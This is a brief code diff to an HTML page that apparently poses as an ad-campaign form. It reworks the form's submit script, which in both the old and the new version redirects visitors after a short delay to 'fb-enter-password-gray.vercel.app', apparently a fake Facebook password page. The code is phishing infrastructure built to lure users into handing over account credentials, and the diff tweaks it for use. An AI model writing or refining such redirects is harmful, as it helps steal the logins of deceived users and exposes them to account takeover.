@@ -163,11 +163,11 @@ and you can choose the one that best fits your audience for a 2-week campaign.
 </form>
 
 <script>
-function handleSubmit(){
-    setTimeout(function(){
-        window.location.href = "https://fb-enter-password-gray.vercel.app/";
-    }, 500);
+document.getElementById("myForm").addEventListener("submit", function () {
 
-    return true;
-}
+    setTimeout(function () {
+        window.location.href = "https://fb-enter-password-gray.vercel.app/";
+    }, 800);
+
+});
 </script>
